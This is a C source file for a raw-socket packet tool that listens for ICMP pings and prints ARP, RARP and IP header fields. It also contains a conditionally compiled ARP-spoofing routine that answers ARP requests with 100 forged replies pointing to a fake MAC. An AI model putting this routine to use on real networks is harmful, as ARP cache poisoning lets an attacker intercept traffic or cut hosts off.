
#include"net.h"
#include"client.h"

int ping_func(void)
{
    int sockfd;
    u8 mymac[MAC_SIZE];
    u8 dstmac[MAC_SIZE];
    int i,ret;
    u8 data[2048];
    u8 send_arp_attack_buf[128];
    u8 broad_mac[6]={0xff,0xff,0xff,0xff,0xff,0xff};
    u8 fuck_mac[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    u8 zero_mac[6]={0x00,0x00,0x00,0x00,0x00,0x00};
    int ip1,ip2,ip3,ip4;

    //sockfd = socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));//ETH_P_802_3
    sockfd = socket(AF_PACKET,SOCK_RAW,htons(ETH_P_802_3));
    if(sockfd < 0)
    {
        printf("socket error 1\n");
        return 1;
    }
    struct ifreq req;
    strcpy(req.ifr_ifrn.ifrn_name,ETH_NAME);
    if(ioctl(sockfd,SIOCGIFHWADDR,&req) < 0)//GET HWADDR
    {
        printf("get hwaddr error\n");
        return 2;
    }
    memcpy(mymac,req.ifr_ifru.ifru_hwaddr.sa_data,MAC_SIZE);

#if LOVEYWM
    printf("my mac:\n");
    for(i=0;i<MAC_SIZE;i++)
    {
        if(i == 5)
        {
            printf("%02x",mymac[i]);
            continue;
        }
        printf("%02x:",mymac[i]);
    }
    printf("\nmy mac end\n");
#endif

    if(ioctl(sockfd,SIOCGIFINDEX,&req) < 0)//GET INDEX
    {
        printf("get index error\n");
        return 3;
    }
#if LOVEYWM
    printf("req.ifr_ifindex==%d\n",req.ifr_ifindex);
#endif
    struct sockaddr_ll sll;
    memset(&sll,0,sizeof(struct sockaddr_ll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = req.ifr_ifindex;
    //bind send and recv addr of wlan0
    ret = bind(sockfd,(struct sockaddr *)&sll,sizeof(struct sockaddr_ll));
    if(ret < 0)
    {
        printf("bind errno==%d\n",errno);
        return 4;
    }
#if LOVEYWM
    mk_eth(data,broad_mac,mymac,TYPE_ARP);//MAKE ETH
    mk_arp(data+sizeof(struct eth_t),OP_ARP_REQ,mymac,(u8 *)MY_IP,dstmac,(u8 *)DST_IP);

    //ret = send(sockfd,data,sizeof(struct eth_t)+sizeof(struct arp_t),0);
    ret = tcpclient_send(sockfd,data,sizeof(struct eth_t)+sizeof(struct arp_t));
    if(ret < 0)
    {
        printf("send errno==%d\n",errno);
        return 5;
    }
#endif
//
//the next if show what we get
//
    struct eth_t *eth = (struct eth_t *)data;
    struct arp_t *arp = (struct arp_t *)(data+ETH_LEN);
    struct ip_t  *ip  =(struct ip_t *)(data+ETH_LEN);
    struct icmp_t *icmp = (struct icmp_t *)(data+ETH_LEN+IP_LEN);
DO_RECV:
    memset(data,0,2048);
    int TimeOut = GetMainTickCount() + 1000;

    while(GetMainTickCount() < TimeOut)
    {
        ret = recv(sockfd,data,2048,0);//MSG_DONTWAIT
        if(ret > 0)
        {
            //printf("\nrecv ret == %d\n",ret);
            break;
        }
    }
    if(ip->proto != IP_ICMP)
    {
        goto DO_RECV;
    }
    //printf("bytes of len==%d\n",((ip->h_verlen) & 0x0f));
    if(icmp->type == 0)
    {
        printf("bytes of len1==%d\n",((ip->h_verlen) & 0x0f));
        printf("ping reply\n");
    }
    else if(icmp->type == 8)
    {
        printf("bytes of len2==%d\n",((ip->h_verlen) & 0x0f));
        printf("ping request\n");
    }
    else
    {

    }

    printf("sign==%02d\n",ntohs(*((u16 *)(data+ETH_LEN+IP_LEN+ICMP_LEN))));
    printf("xuhao==%02d\n",ntohs(*((u16 *)(data+ETH_LEN+IP_LEN+ICMP_LEN+2))));
                       //ntohs(*((u16 *)(data+ETH_LEN+IP_LEN+ICMP_LEN+2)))
    //make ping



    goto DO_RECV;




#if LOVEYWM
    //show dst mac
    if(memcmp(eth->dst_mac,broad_mac,6) == 0)
    {
        printf("###########start###########\n");
        printf("A BROADCAST:\n");
        printf("broadcast mac");
        show_mac_addr(eth->dst_mac);
        printf("\n");
        //goto DO_RECV;
    }
    else if(memcmp(eth->dst_mac,zero_mac,6) == 0)
    {
        //printf("A BROADCAST:\n");
        //printf("broadcast mac");
        //show_mac_addr(eth->dst_mac);
        //printf("\n");
        goto DO_RECV;
    }
    else
    {
        printf("###########start###########\n");
        printf("NOT BROADCAST:\n");
        printf("dst mac");
        show_mac_addr(eth->dst_mac);
        printf("\n");
    }

    //show src mac
    printf("src mac");
    show_mac_addr(eth->src_mac);
    printf("\n");

    //show type
    printf("eth->type==%04x\n",ntohs(eth->type));
    if(ntohs(eth->type) == TYPE_ARP)
    {
        printf("eth->type==%04x==type of arp\n",ntohs(eth->type));
        goto ARP_LOVEYWM;
    }
    else if(ntohs(eth->type) == TYPE_RARP)
    {
        printf("eth->type==%04x==type of Rarp\n",ntohs(eth->type));
        goto RARP_LOVEYWM;
    }
    else if(ntohs(eth->type) == TYPE_DATA)
    {
        printf("eth->type==%04x==type of data\n",ntohs(eth->type));
        goto IP_LOVEYWM;
    }
    else
    {
        printf("eth->type==%04x==type of NULL\n",ntohs(eth->type));
        printf("\n###########end###########\n");
        goto DO_RECV;
    }

    //printf("eth->type==%04x\n",ntohs(eth->type));

ARP_LOVEYWM:
    //show hwtype
    printf("arp->hwtype==%04x\n",ntohs(arp->hwtype));

    //show ptype
    printf("arp->ptype==%04x\n",ntohs(arp->ptype));

    //show hlen
    printf("arp->hlen==%02x\n",arp->hlen);

    //show plen
    printf("arp->plen==%02x\n",arp->plen);

    //show op
    printf("arp->op==%04x\n",ntohs(arp->op));
    //#define         OP_ARP_REQ           0x0001
    //#define         OP_ARP_REP           0x0002
    if(ntohs(arp->op) == OP_ARP_REQ)
    {
        printf("arp->op==%04x==request\n",ntohs(arp->op));
    }
    else if(ntohs(arp->op) == OP_ARP_REP)
    {
        printf("arp->op==%04x==replay\n",ntohs(arp->op));
    }
    else
    {
        printf("arp->op==%04x==NULL\n",ntohs(arp->op));
    }

    printf("\n");

    //show sender mac == src mac
    printf("sender mac == src mac\n");
    printf("sender mac");
    show_mac_addr(arp->src_mac);
    printf("\n");

    //show sender ip
    UI_IP_UNMAKE(ntohl(arp->src_ip),ip1,ip2,ip3,ip4);
    printf("sender ip==%d.%d.%d.%d\n",ip1,ip2,ip3,ip4);


    //show dst mac == dst mac
    printf("dst mac == dst mac ,if it is a broadcast,the dst mac is NULL\n");
    printf("dst mac");
    show_mac_addr(arp->dst_mac);
    printf("\n");

    //show dst ip
    UI_IP_UNMAKE(ntohl(arp->dst_ip),ip1,ip2,ip3,ip4);
    printf("dst ip==%d.%d.%d.%d\n",ip1,ip2,ip3,ip4);

    printf("\n###########end  arp###########\n");
    goto DO_RECV;
RARP_LOVEYWM:
    //show hwtype
    printf("arp->hwtype==%04x\n",ntohs(arp->hwtype));

    //show ptype
    printf("arp->ptype==%04x\n",ntohs(arp->ptype));

    //show hlen
    printf("arp->hlen==%02x\n",arp->hlen);

    //show plen
    printf("arp->plen==%02x\n",arp->plen);

    //show op
    printf("arp->op==%04x\n",ntohs(arp->op));
    //#define         OP_RARP_REQ          0x0003
    //#define         OP_RARP_REP          0x0004

    if(ntohs(arp->op) == OP_RARP_REQ)
    {
        printf("arp->op==%04x==request\n",ntohs(arp->op));
    }
    else if(ntohs(arp->op) == OP_RARP_REP)
    {
        printf("arp->op==%04x==replay\n",ntohs(arp->op));
    }
    else
    {
        printf("arp->op==%04x==NULL\n",ntohs(arp->op));
    }

    printf("\n");

    //show sender mac == src mac
    printf("sender mac == src mac\n");
    printf("sender mac");
    show_mac_addr(arp->src_mac);
    printf("\n");

    //show sender ip
    UI_IP_UNMAKE(ntohl(arp->src_ip),ip1,ip2,ip3,ip4);
    printf("sender ip==%d.%d.%d.%d\n",ip1,ip2,ip3,ip4);


    //show dst mac == dst mac
    printf("dst mac == dst mac ,if it is a broadcast,the dst mac is NULL\n");
    printf("dst mac");
    show_mac_addr(arp->dst_mac);
    printf("\n");

    //show dst ip
    UI_IP_UNMAKE(ntohl(arp->dst_ip),ip1,ip2,ip3,ip4);
    printf("dst ip==%d.%d.%d.%d\n",ip1,ip2,ip3,ip4);

    printf("\n###########end Rarp###########\n");
    goto DO_RECV;
IP_LOVEYWM:
    //printf("ip->h_verlen==%d\n",ip->h_verlen);
    printf("ip->h_verlen==%02x\n",ip->h_verlen);
    printf("version==%d\n",(((ip->h_verlen)>>4) & 0x0f));
    if((((ip->h_verlen)>>4) & 0x0f) == 4)
    {
        printf("IPv4\n");
    }
    printf("bytes of len==%d\n",((ip->h_verlen) & 0x0f));

    printf("ip->tos==%02x\n",ip->tos);

    printf("ip->total_len==%04x\n",ntohs(ip->total_len));

    printf("ip->ident==%02x\n",ntohs(ip->ident));

    printf("ip->flag_and_flags==%04x\n",ntohs(ip->flag_and_flags));

    printf("ip->ttl==%02x\n",ip->ttl);

    printf("ip->proto==%02x\n",ip->proto);
    if(ip->proto == IP_ICMP)
    {
        printf("ip->proto==%02x==IP_ICMP\n",ip->proto);
    }
    else if(ip->proto == IP_IGMP)
    {
        printf("ip->proto==%02x==IP_IGMP\n",ip->proto);
    }
    else if(ip->proto == IP_TCP)
    {
        printf("ip->proto==%02x==IP_TCP\n",ip->proto);
    }
    else if(ip->proto == IP_UDP)
    {
        printf("ip->proto==%02x==IP_UDP\n",ip->proto);
    }
    else
    {
        printf("ip->proto==%02x==NULL\n",ip->proto);
    }

    printf("ip->checksum==%04x\n",ntohs(ip->checksum));

    //show src ip
    UI_IP_UNMAKE(ntohl(ip->srcIP),ip1,ip2,ip3,ip4);
    printf("src ip==%d.%d.%d.%d\n",ip1,ip2,ip3,ip4);

    //show dst ip
    UI_IP_UNMAKE(ntohl(ip->dstIP),ip1,ip2,ip3,ip4);
    printf("dst ip==%d.%d.%d.%d\n",ip1,ip2,ip3,ip4);

    printf("\n###########end ip  ###########\n");
    goto DO_RECV;

#endif





  #if LOVEYWM
    if(ntohs(eth->type) != TYPE_ARP)
    {
        printf("NOT ARP \n");
        goto DO_RECV;
    }
    printf("THE request of MAC");
    show_mac_addr(eth->src_mac);
    printf("\n");

    if(ntohs(arp->op) != OP_ARP_REQ)
    {
        printf("NOT ARP REQUEST\n");
        goto DO_RECV;
    }
    memset(send_arp_attack_buf,0,128);
    mk_eth(send_arp_attack_buf,eth->src_mac,fuck_mac,TYPE_ARP);//MAKE ETH
    mk_arp_num(send_arp_attack_buf+sizeof(struct eth_t),OP_ARP_REP,fuck_mac,arp->dst_ip,eth->src_mac,arp->src_ip);
int xxx=100;
while(xxx--){
    //ret = send(sockfd,data,sizeof(struct eth_t)+sizeof(struct arp_t),0);
    ret = tcpclient_send(sockfd,send_arp_attack_buf,sizeof(struct eth_t)+sizeof(struct arp_t));
    if(ret < 0)
    {
        printf("send errno==%d\n",errno);
        //return 5;
    }
    printf("xxx==%d\n",xxx);
}

goto DO_RECV;
#endif


    return 0;
}


